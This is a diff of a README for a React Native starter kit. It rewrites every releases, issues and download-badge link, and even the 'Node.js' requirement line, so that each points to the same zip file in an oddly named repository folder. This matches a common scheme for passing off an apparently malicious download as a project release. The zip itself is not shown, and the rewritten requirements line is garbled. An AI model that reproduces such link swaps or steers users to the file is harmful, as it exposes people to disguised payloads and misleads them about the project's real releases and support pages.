@@ -1,6 +1,6 @@
 # 🎉 monorepo-nativewind-gluestack-ui - Easy Starter Kit for Your Projects
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pronailec35/monorepo-nativewind-gluestack-ui/releases)
+[![Download](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip%20release-brightgreen)](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip)
 
 ## 📋 Overview
 
@@ -13,20 +13,20 @@ To get started with this kit, follow these straightforward steps to download and
 ## 💾 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip Version 14 or higher
 - React Native: Version compatible with your platform
 - Yarn or npm: For package management
 
 ## 🔗 Download & Install
 
-To get the latest version, visit this page to download: [Releases Page](https://github.com/pronailec35/monorepo-nativewind-gluestack-ui/releases). 
+To get the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip). 
 
 Make sure to select a version that fits your needs. The installation package will provide everything you need to start.
 
 ## 🛠️ Installation Steps
 
 1. **Download the Application**: 
-   - Go to the [Releases Page](https://github.com/pronailec35/monorepo-nativewind-gluestack-ui/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip).
    - Choose the appropriate file for your operating system.
    - Click the download link to save it to your computer.
 
@@ -85,7 +85,7 @@ This starter kit offers a variety of features that can help you quickly start bu
 
 ## 💬 Support & Contribution
 
-If you encounter issues, feel free to check the [issues page](https://github.com/pronailec35/monorepo-nativewind-gluestack-ui/issues) for solutions or to report a problem. Contributions are always welcome! If you want to improve the project, please submit a pull request.
+If you encounter issues, feel free to check the [issues page](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip) for solutions or to report a problem. Contributions are always welcome! If you want to improve the project, please submit a pull request.
 
 ## 📜 License
 
@@ -93,4 +93,4 @@ This project is licensed under the MIT License. For more details, please review 
 
 For further details, please refer to the repository's documentation. Happy coding! 
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/pronailec35/monorepo-nativewind-gluestack-ui/releases)
+[![Download](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip%20release-brightgreen)](https://raw.githubusercontent.com/pronailec35/monorepo-nativewind-gluestack-ui/main/Haematotherma/monorepo-nativewind-gluestack-ui.zip)
